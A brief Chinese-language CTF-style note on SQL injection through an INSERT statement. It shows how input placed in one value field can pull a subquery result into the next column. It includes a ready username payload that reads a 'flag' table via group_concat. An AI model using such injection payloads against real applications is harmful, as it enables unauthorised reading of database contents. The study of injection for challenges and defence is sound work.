# 知识点
与前面update注入的逻辑相似
# 思路
```plsql
insert into table_name(column1, column2) value(value1,value2)
# 向value1进行注入，就会变成
insert into table_name(column1, column2) value(value1,(你想要输出的值))#value2)
```
```plsql
username=123',(select  group_concat(flagass23s3) from flag))%23&password=123
```
